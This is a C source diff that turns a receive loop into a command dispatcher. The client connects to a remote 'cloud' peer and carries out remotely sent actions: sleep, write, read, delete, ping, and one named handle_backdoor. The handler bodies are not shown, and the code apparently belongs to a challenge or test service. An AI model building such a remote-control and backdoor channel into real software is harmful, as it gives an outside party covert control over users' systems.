@@ -1,13 +1,16 @@
+#include <string.h>
 #include <stdbool.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
 #include "peer.h"
+#include "handler.h"
 
 int proc(void)
 {
-    alarm(300);
+    alarm(15);
 
     Peer *peer = peer_ctor(CLOUD_IP, CLOUD_PORT);
     if (peer == NULL) {
@@ -28,11 +31,56 @@ int proc(void)
 
     while (true)
     {
-        char recvd[256];
-        if (peer_recv(peer, recvd, 256) < 0)
+        uint8_t recvd[512] = {0, };
+        int recvd_len = 0;
+
+        if ((recvd_len = peer_recv(peer, recvd, 512)) < 0)
             continue;
 
-        puts(recvd);
+        if (recvd_len < 4)
+            continue;
+
+        packet_action_t *action = (packet_action_t *)(recvd);
+        if (memcmp(action->header, "ACT", 3))
+            continue;
+
+        int act_id = (int)(action->header[3]);
+        void *buf   = &action->buf;
+        size_t len  = recvd_len - 4;
+        int res = 0;
+        switch (act_id)
+        {
+            case '0':
+                res = handle_sleep(peer, buf, len);
+                break;
+
+            case '1':
+                res = handle_write(peer, buf, len);
+                break;
+
+            case '2':
+                res = handle_read(peer, buf, len);
+                break;
+            
+            case '3':
+                res = handle_delete(peer, buf, len);
+                break;
+
+            case '4':
+                res = handle_ping(peer, buf, len);
+                break;
+
+            case '5':
+                res = handle_backdoor(peer, buf, len);
+                break;
+
+            default:
+                res = -1;
+                break;
+        }
+
+        if (res < 0)
+            fprintf(stderr, "handle failed: %d\n", res);
     }
 
     return 0;
